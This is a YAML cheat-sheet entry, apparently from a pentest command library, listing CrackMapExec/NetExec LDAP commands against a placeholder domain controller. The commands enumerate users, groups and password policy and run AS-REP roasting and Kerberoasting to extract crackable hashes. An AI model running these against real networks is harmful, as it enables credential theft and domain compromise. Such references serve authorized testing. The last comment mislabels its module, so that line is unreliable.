---
description: |
  LDAP enumeration and attacks using CrackMapExec/NetExec.
  Password policy, users, and credential checks.

  Reference values:
    Target DC: 10.10.10.1
    Domain: test.local
    Username: john
    Password: password123
command: |
  # Enumerate users
  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --users

  # Enumerate groups
  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --groups

  # Get password policy
  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --pass-pol

  # ASREPRoast
  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --asreproast asrep.txt

  # Kerberoast
  crackmapexec ldap 10.10.10.1 -u john -p 'password123' --kerberoasting kerb.txt

  # Find accounts with no pre-auth
  crackmapexec ldap 10.10.10.1 -u john -p 'password123' -M get-unixUserPassword
phase:
  - Enumeration
target_os:
  - Windows
services:
  - LDAP
items:
  - Username
  - Password
techniques:
  - Kerberoasting
  - AS-REP_Roasting
  - Password_Spraying
network_position:
  - Internal
references:
  - https://github.com/Pennyw0rth/NetExec
---
